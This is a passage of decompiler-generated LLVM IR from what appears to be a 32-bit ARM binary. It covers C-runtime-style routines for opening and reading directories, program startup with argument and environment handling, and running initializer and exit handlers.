  uselistorder label %dec_label_pc_12a88thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_12b60(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12b60:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_12b64 = call i32 @function_12a34()
  ret i32 %v0_12b64
}

define i32 @function_12b78() local_unnamed_addr {
dec_label_pc_12b78:
  %v1_12b80 = call i32 @function_14df0(i32 8)
  ret i32 %v1_12b80
}

define i32 @function_12b8c(i32* %arg1) local_unnamed_addr {
dec_label_pc_12b8c:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_12b8c = load i32, i32* @r4, align 4
  %v6_12b8c = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_12b98 = load i32, i32* %arg1, align 4
  store i32 %v2_12b98, i32* @r0, align 4
  %v1_12b9c = call i32 @function_15b20(i32 %v2_12b98)
  store i32 %v1_12b9c, i32* @r5, align 4
  %v0_12ba4 = load i32, i32* @r4, align 4
  %v1_12ba8 = call i32 @function_13780(i32 %v0_12ba4)
  %v0_12bac = load i32, i32* @r5, align 4
  store i32 %v3_12b8c, i32* @r4, align 4
  store i32 %v6_12b8c, i32* @r5, align 4
  ret i32 %v0_12bac

; uselistorder directives
  uselistorder i32 (i32)* @function_15b20, { 24, 12, 31, 30, 11, 29, 28, 10, 9, 8, 26, 27, 25, 7, 6, 5, 4, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 3, 2, 0, 1 }
}

define i32 @function_12bbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_12bbc:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12bbc = load i32, i32* @r7, align 4
  store i32 %v3_12bbc, i32* %stack_var_-8, align 4
  %v0_12bc4 = load i32, i32* @r0, align 4
  %v2_12bc4 = call i32 @function_130e0(i32 %v0_12bc4, i32 540672)
  store i32 %v2_12bc4, i32* %r0.global-to-local, align 4
  store i32 %v2_12bc4, i32* @r7, align 4
  %v1_12bc8 = icmp slt i32 %v2_12bc4, 0
  br i1 %v1_12bc8, label %.thread5, label %dec_label_pc_12bd4

.thread5:                                         ; preds = %dec_label_pc_12bbc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12c00

dec_label_pc_12bd4:                               ; preds = %dec_label_pc_12bbc
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_12bdc = call i32 @function_1320c(i32 1, i32 2080)
  store i32 %v2_12bdc, i32* %r0.global-to-local, align 4
  %v2_12be0 = icmp eq i32 %v2_12bdc, 0
  br i1 %v2_12be0, label %dec_label_pc_12bf0, label %.thread.dec_label_pc_12c00_crit_edge

.thread.dec_label_pc_12c00_crit_edge:             ; preds = %dec_label_pc_12bd4
  store i32 %v2_12bdc, i32* %r0.global-to-local, align 4
  %v1_12be8 = load i32, i32* @r7, align 4
  %v3_12be8 = inttoptr i32 %v2_12bdc to i32*
  store i32 %v1_12be8, i32* %v3_12be8, align 4
  %v1_12c04.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12c00

dec_label_pc_12bf0:                               ; preds = %dec_label_pc_12bd4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12c00

dec_label_pc_12c00:                               ; preds = %.thread5, %.thread.dec_label_pc_12c00_crit_edge, %dec_label_pc_12bf0
  %v1_12c04 = phi i32 [ %v1_12c04.pre, %.thread.dec_label_pc_12c00_crit_edge ], [ 0, %dec_label_pc_12bf0 ], [ 0, %.thread5 ]
  %v2_12c00 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12c00, i32* @r7, align 4
  ret i32 %v1_12c04

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 (i32, i32)* @function_1320c, { 34, 4, 35, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_130e0, { 5, 7, 6, 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_12c00, { 2, 1, 0 }
}

define i32 @function_12c08(i32* %arg1) local_unnamed_addr {
dec_label_pc_12c08:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_12c08 = load i32, i32* @r4, align 4
  store i32 %v3_12c08, i32* %stack_var_-12, align 4
  %v1_12c0c = add i32 %tmp, 16
  store i32 %v1_12c0c, i32* %r2.global-to-local, align 4
  %v1_12c10 = inttoptr i32 %v1_12c0c to i32*
  %v2_12c10 = load i32, i32* %v1_12c10, align 4
  store i32 %v2_12c10, i32* %r2.global-to-local, align 4
  %v3_12c10 = add i32 %tmp, 20
  %v4_12c10 = inttoptr i32 %v3_12c10 to i32*
  %v5_12c10 = load i32, i32* %v4_12c10, align 4
  store i32 %v5_12c10, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  %v5_12c20 = icmp slt i32 %v2_12c10, %v5_12c10
  br i1 %v5_12c20, label %dec_label_pc_12c74, label %dec_label_pc_12c24

dec_label_pc_12c24:                               ; preds = %dec_label_pc_12c08
  store i32 217, i32* %r7.global-to-local, align 4
  %v2_12c28 = load i32, i32* %arg1, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_12c28, i32* %r7.global-to-local, align 4
  %tmp9 = icmp slt i32 %v2_12c28, 1
  br i1 %tmp9, label %dec_label_pc_12c4c, label %.dec_label_pc_12c74_crit_edge

.dec_label_pc_12c74_crit_edge:                    ; preds = %dec_label_pc_12c24
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_12c28, i32* %v4_12c10, align 4
  %v5_12c44 = load i32, i32* %r3.global-to-local, align 4
  %v6_12c44 = load i32, i32* %ip.global-to-local, align 4
  %v7_12c44 = add i32 %v6_12c44, 16
  %v8_12c44 = inttoptr i32 %v7_12c44 to i32*
  store i32 %v5_12c44, i32* %v8_12c44, align 4
  %v0_12c74.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12c74

dec_label_pc_12c4c:                               ; preds = %dec_label_pc_12c24
  %v1_12c4c = add i32 %v2_12c28, 2
  %v7_12c4c = icmp eq i32 %v1_12c4c, 0
  br i1 %v7_12c4c, label %bb10, label %bb

bb:                                               ; preds = %dec_label_pc_12c4c
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_12c4c, %bb
  %storemerge = phi i32 [ 1, %bb ], [ %v1_12c4c, %dec_label_pc_12c4c ]
  %v0_12c54 = phi i32 [ 1, %bb ], [ 0, %dec_label_pc_12c4c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %tmp12 = icmp slt i32 %v2_12c28, 0
  %v4_12c54 = zext i1 %tmp12 to i32
  %v5_12c54 = and i32 %v0_12c54, %v4_12c54
  %v6_12c54 = icmp eq i32 %v5_12c54, 0
  br i1 %v6_12c54, label %bb11, label %dec_label_pc_12c60

bb11:                                             ; preds = %bb10
  store i32 0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_12c9c

dec_label_pc_12c60:                               ; preds = %bb10
  %v0_12c60 = call i32 @function_12ecc()
  %v0_12c64 = load i32, i32* %r7.global-to-local, align 4
  %v1_12c64 = sub i32 0, %v0_12c64
  store i32 %v1_12c64, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_12c6c = inttoptr i32 %v0_12c60 to i32*
  store i32 %v1_12c64, i32* %v2_12c6c, align 4
  br label %dec_label_pc_12c9c

dec_label_pc_12c74:                               ; preds = %.dec_label_pc_12c74_crit_edge, %dec_label_pc_12c08
  %v1_12c90 = phi i32 [ %v0_12c74.pre, %.dec_label_pc_12c74_crit_edge ], [ %tmp, %dec_label_pc_12c08 ]
  %v1_12c74 = add i32 %v1_12c90, 16
  %v2_12c74 = inttoptr i32 %v1_12c74 to i32*
  %v3_12c74 = load i32, i32* %v2_12c74, align 4
  %v1_12c78 = add i32 %v1_12c90, 32
  store i32 %v1_12c78, i32* %r3.global-to-local, align 4
  %v2_12c7c = add i32 %v3_12c74, %v1_12c78
  store i32 %v2_12c7c, i32* %lr.global-to-local, align 4
  %v1_12c80 = add i32 %v2_12c7c, 16
  %v2_12c80 = inttoptr i32 %v1_12c80 to i16*
  %v3_12c80 = load i16, i16* %v2_12c80, align 2
  %v4_12c80 = zext i16 %v3_12c80 to i32
  store i32 %v4_12c80, i32* %r2.global-to-local, align 4
  %v1_12c84 = add i32 %v2_12c7c, 8
  store i32 %v1_12c84, i32* %r3.global-to-local, align 4
  %v1_12c88 = inttoptr i32 %v1_12c84 to i32*
  %v2_12c88 = load i32, i32* %v1_12c88, align 4
  store i32 %v2_12c88, i32* %r3.global-to-local, align 4
  %v3_12c88 = add i32 %v2_12c7c, 12
  %v4_12c88 = inttoptr i32 %v3_12c88 to i32*
  %v5_12c88 = load i32, i32* %v4_12c88, align 4
  store i32 %v5_12c88, i32* %r4.global-to-local, align 4
  %v2_12c8c = add i32 %v4_12c80, %v3_12c74
  store i32 %v2_12c8c, i32* %r2.global-to-local, align 4
  %v2_12c90 = add i32 %v1_12c90, 8
  %v3_12c90 = inttoptr i32 %v2_12c90 to i32*
  store i32 %v2_12c88, i32* %v3_12c90, align 4
  %v0_12c94 = load i32, i32* %r4.global-to-local, align 4
  %v1_12c94 = load i32, i32* %ip.global-to-local, align 4
  %v2_12c94 = add i32 %v1_12c94, 12
  %v3_12c94 = inttoptr i32 %v2_12c94 to i32*
  store i32 %v0_12c94, i32* %v3_12c94, align 4
  %v0_12c98 = load i32, i32* %r2.global-to-local, align 4
  %v1_12c98 = load i32, i32* %ip.global-to-local, align 4
  %v2_12c98 = add i32 %v1_12c98, 16
  %v3_12c98 = inttoptr i32 %v2_12c98 to i32*
  store i32 %v0_12c98, i32* %v3_12c98, align 4
  br label %dec_label_pc_12c9c

dec_label_pc_12c9c:                               ; preds = %bb11, %dec_label_pc_12c60, %dec_label_pc_12c74
  %v0_12c9c = load i32, i32* %lr.global-to-local, align 4
  %v2_12ca4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12ca4, i32* @r4, align 4
  ret i32 %v0_12c9c

; uselistorder directives
  uselistorder i32 %v1_12c90, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %lr.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_12c9c, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_12cb0(i32 %arg1) local_unnamed_addr {
dec_label_pc_12cb0:
  %v1_12cb0 = load i32, i32* @r0, align 4
  ret i32 %v1_12cb0
}

define i32 @function_12cb4(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_12cb4:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %tmp42 = call i32 @__decompiler_undefined_function_0()
  %tmp43 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = call i32 @__decompiler_undefined_function_0()
  %tmp45 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v4_12cb8 = mul i32 %arg2, 4
  %v5_12cb8 = add i32 %v4_12cb8, 4
  %v1_12cbc = add i32 %v5_12cb8, %tmp
  store i32 %v1_12cbc, i32* @r5, align 4
  %v2_12cc4 = load i32, i32* %arg3, align 4
  store i32 %v2_12cc4, i32* @r7, align 4
  store i32 %v1_12cbc, i32* @global_var_227cc.525, align 4
  %v2_12ccc = ptrtoint i32* %stack_var_-208 to i32
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg1, i32* @sl, align 4
  br label %dec_label_pc_12ce0

dec_label_pc_12ce0:                               ; preds = %dec_label_pc_12ce0, %dec_label_pc_12cb4
  %v0_12ce0 = phi i32 [ %v4_12ce4, %dec_label_pc_12ce0 ], [ %v1_12cbc, %dec_label_pc_12cb4 ]
  store i32 %v0_12ce0, i32* @r4, align 4
  %v1_12ce4 = inttoptr i32 %v0_12ce0 to i32*
  %v2_12ce4 = load i32, i32* %v1_12ce4, align 4
  store i32 %v2_12ce4, i32* %r1.global-to-local, align 4
  %v4_12ce4 = add i32 %v0_12ce0, 4
  %v2_12ce8 = icmp eq i32 %v2_12ce4, 0
  br i1 %v2_12ce8, label %dec_label_pc_12cf0, label %dec_label_pc_12ce0

dec_label_pc_12cf0:                               ; preds = %dec_label_pc_12ce0
  store i32 152, i32* %r2.global-to-local, align 4
  store i32 %v2_12ccc, i32* %r0.global-to-local, align 4
  %v3_12cf8 = bitcast i32* %stack_var_-208 to i8*
  %v4_12cf8 = call i32 @function_15548(i8* %v3_12cf8, i32 0, i32 152)
  store i32 %v4_12cf8, i32* %r0.global-to-local, align 4
  %v0_12d00 = load i32, i32* @r4, align 4
  %v1_12d00 = add i32 %v0_12d00, 4
  store i32 %v1_12d00, i32* %r2.global-to-local, align 4
  store i32 %v0_12d00, i32* %r1.global-to-local, align 4
  store i32 %v1_12d00, i32* @global_var_22aec.528, align 4
  %v2_12d2819 = inttoptr i32 %v1_12d00 to i32*
  %v3_12d2820 = load i32, i32* %v2_12d2819, align 4
  %v2_12d2c22 = icmp eq i32 %v3_12d2820, 0
  br i1 %v2_12d2c22, label %dec_label_pc_12d34, label %dec_label_pc_12d10.lr.ph

dec_label_pc_12d10.lr.ph:                         ; preds = %dec_label_pc_12cf0
  %v6_12d18 = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_12d10

dec_label_pc_12d10:                               ; preds = %dec_label_pc_12d10.lr.ph, %dec_label_pc_12d28
  %v4_12d14 = phi i32 [ %v0_12d00, %dec_label_pc_12d10.lr.ph ], [ %v1_12d24, %dec_label_pc_12d28 ]
  %v5_12d1c = phi i32 [ %v3_12d2820, %dec_label_pc_12d10.lr.ph ], [ %v3_12d28, %dec_label_pc_12d28 ]
  %v2_12d10 = icmp ugt i32 %v5_12d1c, 36
  %v7_12d10 = icmp eq i32 %v5_12d1c, 37
  %v2_12d14 = xor i1 %v2_12d10, true
  %v3_12d14 = or i1 %v7_12d10, %v2_12d14
  br i1 %v3_12d14, label %bb, label %.thread38

bb:                                               ; preds = %dec_label_pc_12d10
  %v5_12d14 = add i32 %v4_12d14, 8
  %v6_12d14 = inttoptr i32 %v5_12d14 to i32*
  %v7_12d14 = load i32, i32* %v6_12d14, align 4
  store i32 %v7_12d14, i32* %r2.global-to-local, align 4
  store i32 %v6_12d18, i32* %r0.global-to-local, align 4
  %v6_12d1c = and i32 %v5_12d1c, 1073741824
  %v7_12d1c = icmp ne i32 %v6_12d1c, 0
  %v8_12d1c = mul i32 %v5_12d1c, 4
  %v9_12d1c = add i32 %v8_12d1c, %v6_12d18
  br label %.thread38

.thread38:                                        ; preds = %dec_label_pc_12d10, %bb
  %v5_12d20 = phi i32 [ %v9_12d1c, %bb ], [ %v5_12d1c, %dec_label_pc_12d10 ]
  %v1_12d2023 = phi i1 [ %v7_12d1c, %bb ], [ %v2_12d10, %dec_label_pc_12d10 ]
  %v2_12d20 = xor i1 %v1_12d2023, true
  %v3_12d20 = or i1 %v7_12d10, %v2_12d20
  br i1 %v3_12d20, label %bb60, label %dec_label_pc_12d28

bb60:                                             ; preds = %.thread38
  %v4_12d20 = load i32, i32* %r2.global-to-local, align 4
  %v6_12d20 = add i32 %v5_12d20, -176
  %v7_12d20 = inttoptr i32 %v6_12d20 to i32*
  store i32 %v4_12d20, i32* %v7_12d20, align 4
  %v0_12d24.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12d28

dec_label_pc_12d28:                               ; preds = %.thread38, %bb60
  %v0_12d24 = phi i32 [ %v4_12d14, %.thread38 ], [ %v0_12d24.pre, %bb60 ]
  %v1_12d24 = add i32 %v0_12d24, 8
  store i32 %v1_12d24, i32* %r1.global-to-local, align 4
  %v1_12d28 = add i32 %v0_12d24, 12
  %v2_12d28 = inttoptr i32 %v1_12d28 to i32*
  %v3_12d28 = load i32, i32* %v2_12d28, align 4
  %v2_12d2c = icmp eq i32 %v3_12d28, 0
  br i1 %v2_12d2c, label %dec_label_pc_12d28.dec_label_pc_12d34_crit_edge, label %dec_label_pc_12d10

dec_label_pc_12d28.dec_label_pc_12d34_crit_edge:  ; preds = %dec_label_pc_12d28
  br label %dec_label_pc_12d34

dec_label_pc_12d34:                               ; preds = %dec_label_pc_12d28.dec_label_pc_12d34_crit_edge, %dec_label_pc_12cf0
  store i32 %tmp45, i32* %r2.global-to-local, align 4
  %v0_12d54 = load i32, i32* @r7, align 4
  %v2_12d54 = icmp eq i32 %v0_12d54, 0
  store i32 %tmp45, i32* @global_var_22af4.533, align 4
  br i1 %v2_12d54, label %dec_label_pc_12d98, label %dec_label_pc_12d60

dec_label_pc_12d60:                               ; preds = %dec_label_pc_12d34
  store i32 ptrtoint (i32* @global_var_2239c.535 to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_12d54, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2239c.535 to i32), i32* %r0.global-to-local, align 4
  store i32 %v0_12d54, i32* @global_var_223a0.537, align 4
  store i32 %v0_12d54, i32* @global_var_2239c.535, align 4
  %v1_12d8c13 = inttoptr i32 %v0_12d54 to i8*
  %v2_12d8c14 = load i8, i8* %v1_12d8c13, align 1
  %v2_12d9016 = icmp eq i8 %v2_12d8c14, 0
  br i1 %v2_12d9016, label %dec_label_pc_12d98, label %dec_label_pc_12d7c

dec_label_pc_12d7c:                               ; preds = %dec_label_pc_12d60, %.thread
  %v1_12d80 = phi i32 [ %v1_12d88, %.thread ], [ %v0_12d54, %dec_label_pc_12d60 ]
  %v0_12d7c.in = phi i8 [ %v2_12d8c, %.thread ], [ %v2_12d8c14, %dec_label_pc_12d60 ]
  %v7_12d7c = icmp eq i8 %v0_12d7c.in, 47
  br i1 %v7_12d7c, label %bb61, label %.thread

bb61:                                             ; preds = %dec_label_pc_12d7c
  %v2_12d80 = add i32 %v1_12d80, 1
  %v2_12d84 = load i32, i32* %r0.global-to-local, align 4
  %v3_12d84 = inttoptr i32 %v2_12d84 to i32*
  store i32 %v2_12d80, i32* %v3_12d84, align 4
  %v0_12d88.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12d7c, %bb61
  %v0_12d88 = phi i32 [ %v1_12d80, %dec_label_pc_12d7c ], [ %v0_12d88.pre, %bb61 ]
  %v1_12d88 = add i32 %v0_12d88, 1
  store i32 %v1_12d88, i32* %r1.global-to-local, align 4
  %v1_12d8c = inttoptr i32 %v1_12d88 to i8*
  %v2_12d8c = load i8, i8* %v1_12d8c, align 1
  %v2_12d90 = icmp eq i8 %v2_12d8c, 0
  br i1 %v2_12d90, label %dec_label_pc_12d98, label %dec_label_pc_12d7c

dec_label_pc_12d98:                               ; preds = %.thread, %dec_label_pc_12d60, %dec_label_pc_12d34
  store i32 %v2_12ccc, i32* %r0.global-to-local, align 4
  %v1_12d9c = call i32 @function_15de8(i32 %v2_12ccc)
  store i32 %tmp44, i32* @r0, align 4
  %v2_12dac = call i32 @function_12cb0(i32 %tmp44)
  store i32 %v2_12dac, i32* @r0, align 4
  store i32 %tmp56, i32* %r2.global-to-local, align 4
  %v9_12db8 = icmp eq i32 %tmp56, %tmp43
  br i1 %v9_12db8, label %dec_label_pc_12dc0, label %dec_label_pc_12ddc

dec_label_pc_12dc0:                               ; preds = %dec_label_pc_12d98
  store i32 %tmp55, i32* %r2.global-to-local, align 4
  %v9_12dc8 = icmp eq i32 %tmp55, %tmp42
  br i1 %v9_12dc8, label %dec_label_pc_12dd0, label %dec_label_pc_12ddc

dec_label_pc_12dd0:                               ; preds = %dec_label_pc_12dc0
  %v2_12dd4 = icmp eq i32 %tmp41, 0
  br i1 %v2_12dd4, label %dec_label_pc_12e58, label %dec_label_pc_12ddc

dec_label_pc_12ddc:                               ; preds = %dec_label_pc_12dc0, %dec_label_pc_12d98, %dec_label_pc_12dd0
  %v2_12ddc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12ddc, i32* @r4, align 4
  store i32 %v2_12ddc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v3_12dec = bitcast i32* %stack_var_-56 to i8*
  %v4_12dec = call i32 @function_15548(i8* %v3_12dec, i32 0, i32 24)
  store i32 168, i32* %r7.global-to-local, align 4
  store i32 %v2_12ddc, i32* @r0, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12e18

dec_label_pc_12e18:                               ; preds = %bb63, %dec_label_pc_12ddc
  %v1_12e18 = phi i32 [ %v1_12e40, %bb63 ], [ 0, %dec_label_pc_12ddc ]
  %v0_12e18 = load i32, i32* @r4, align 4
  %v2_12e18 = add i32 %v0_12e18, %v1_12e18
  %v1_12e1c = add i32 %v2_12e18, 6
  %v2_12e1c = inttoptr i32 %v1_12e1c to i16*
  %v3_12e1c = load i16, i16* %v2_12e1c, align 2
  %v1_12e20 = and i16 %v3_12e1c, 32
  %v2_12e20 = icmp eq i16 %v1_12e20, 0
  br i1 %v2_12e20, label %bb63, label %dec_label_pc_12e28

dec_label_pc_12e28:                               ; preds = %dec_label_pc_12e18
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_19f7c.540 to i32), i32* @r0, align 4
  store i32 131074, i32* %r1.global-to-local, align 4
  br i1 icmp slt ([10 x i8]* @global_var_19f7c.540, [10 x i8]* null), label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_12e28
  %v3_12e3c = load i32, i32* %ip.global-to-local, align 4
  %v4_12e3c = trunc i32 %v3_12e3c to i8
  %v6_12e3c = inttoptr i32 %v3_12e3c to i8*
  store i8 %v4_12e3c, i8* %v6_12e3c, align 1
  %v0_12e40.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_12e18, %dec_label_pc_12e28, %bb62
  %v0_12e40 = phi i32 [ %v1_12e18, %dec_label_pc_12e18 ], [ %v1_12e18, %dec_label_pc_12e28 ], [ %v0_12e40.pre, %bb62 ]
  %v1_12e40 = add i32 %v0_12e40, 8
  store i32 %v1_12e40, i32* %r2.global-to-local, align 4
  %v7_12e44 = icmp eq i32 %v1_12e40, 24
  br i1 %v7_12e44, label %dec_label_pc_12e4c, label %dec_label_pc_12e18

dec_label_pc_12e4c:                               ; preds = %bb63
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* @global_var_22ae4.542, align 4
  br label %dec_label_pc_12e58

dec_label_pc_12e58:                               ; preds = %dec_label_pc_12dd0, %dec_label_pc_12e4c
  store i32 77412, i32* @lr, align 4
  %v1_12e60 = call i32 @function_80b4()
  store i32 %v1_12e60, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_222b8.547 to i32), i32* %r7.global-to-local, align 4
  br i1 icmp uge (i32* @global_var_222b4.545, i32* @global_var_222b8.547), label %dec_label_pc_12e84, label %dec_label_pc_12e70

dec_label_pc_12e70:                               ; preds = %dec_label_pc_12e70, %dec_label_pc_12e58
  %v0_12e70 = phi i32 [ %v4_12e70, %dec_label_pc_12e70 ], [ ptrtoint (i32* @global_var_222b4.545 to i32), %dec_label_pc_12e58 ]
  %v1_12e70 = inttoptr i32 %v0_12e70 to i32*
  %v2_12e70 = load i32, i32* %v1_12e70, align 4
  %v4_12e70 = add i32 %v0_12e70, 4
  call void @__pseudo_branch(i32 %v2_12e70)
  %v1_12e7c = load i32, i32* %r7.global-to-local, align 4
  %v3_12e7c = icmp ult i32 %v4_12e70, %v1_12e7c
  br i1 %v3_12e7c, label %dec_label_pc_12e70, label %dec_label_pc_12e84

dec_label_pc_12e84:                               ; preds = %dec_label_pc_12e70, %dec_label_pc_12e58
  %v0_12e84 = load i32, i32* @r6, align 4
  store i32 %v0_12e84, i32* %r1.global-to-local, align 4
  %v0_12e88 = load i32, i32* @r5, align 4
  store i32 %v0_12e88, i32* %r2.global-to-local, align 4
  %v0_12e8c = load i32, i32* @r8, align 4
  store i32 %v0_12e8c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_12e98 = call i32 @function_12ee4(i32 %v0_12e8c)
  store i32 %v1_12e98, i32* %r0.global-to-local, align 4
  ret i32 %v1_12e98

; uselistorder directives
  uselistorder i32 %v0_12e70, { 1, 0 }
  uselistorder i32 %v1_12e40, { 1, 2, 0 }
  uselistorder i32 %v1_12e18, { 1, 2, 0 }
  uselistorder i8 %v2_12d8c, { 1, 0 }
  uselistorder i32 %v1_12d88, { 1, 2, 0 }
  uselistorder i32 %v0_12d54, { 0, 4, 3, 2, 1, 5 }
  uselistorder i32 %v3_12d28, { 1, 0 }
  uselistorder i32 %v1_12d24, { 1, 0 }
  uselistorder i32 %v0_12d24, { 1, 0 }
  uselistorder i1 %v2_12d10, { 1, 0 }
  uselistorder i32 %v5_12d1c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_12ce0, { 2, 1, 0 }
  uselistorder i32 %v2_12ccc, { 1, 0, 2 }
  uselistorder i32 %tmp56, { 1, 0 }
  uselistorder i32 %tmp55, { 1, 0 }
  uselistorder i32 %tmp44, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 10, 6, 7, 8, 9, 13, 14, 11, 12, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 1, 9, 5, 6, 7, 8, 2, 10, 0 }
  uselistorder i32 (i32)* @function_12ee4, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32* @global_var_222b4.545, { 1, 0 }
  uselistorder i32 168, { 2, 0, 1 }
  uselistorder i8 47, { 0, 5, 6, 1, 2, 3, 4, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e58, { 1, 0 }
  uselistorder label %bb63, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12ddc, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_12d7c, { 1, 0 }
  uselistorder label %dec_label_pc_12d28, { 1, 0 }
  uselistorder label %.thread38, { 1, 0 }
  uselistorder label %dec_label_pc_12d10, { 1, 0 }
}

define i32 @function_12ecc() local_unnamed_addr {
dec_label_pc_12ecc:
  %v0_12ed0 = call i32 @function_15d60()
  %v1_12ed4 = add i32 %v0_12ed0, -164
  ret i32 %v1_12ed4
}

define i32 @function_12ee0() local_unnamed_addr {
dec_label_pc_12ee0:
  %v1_12ee0 = load i32, i32* @r0, align 4
  ret i32 %v1_12ee0
}

define i32 @function_12ee4(i32 %arg1) local_unnamed_addr {
dec_label_pc_12ee4:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v1_12ef0 = call i32 @function_12ee0()
  store i32 %v1_12ef0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_222b8.547 to i32), i32* %r5.global-to-local, align 4
  br i1 and (i1 icmp ule (i32 ptrtoint (i32* @global_var_222b8.547 to i32), i32 139964), i1 icmp ne (i32 ptrtoint (i32* @global_var_222b8.547 to i32), i32 139964)), label %dec_label_pc_12f00, label %dec_label_pc_12f14

dec_label_pc_12f00:                               ; preds = %dec_label_pc_12ee4, %dec_label_pc_12f00
  %v0_12f003 = phi i32 [ %v1_12f00, %dec_label_pc_12f00 ], [ 139964, %dec_label_pc_12ee4 ]
  %v1_12f00 = add i32 %v0_12f003, -4
  %v2_12f00 = inttoptr i32 %v1_12f00 to i32*
  %v3_12f00 = load i32, i32* %v2_12f00, align 4
  call void @__pseudo_branch(i32 %v3_12f00)
  %v1_12f0c.pre = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_12f00, %v1_12f0c.pre
  br i1 %tmp, label %dec_label_pc_12f00, label %dec_label_pc_12f14

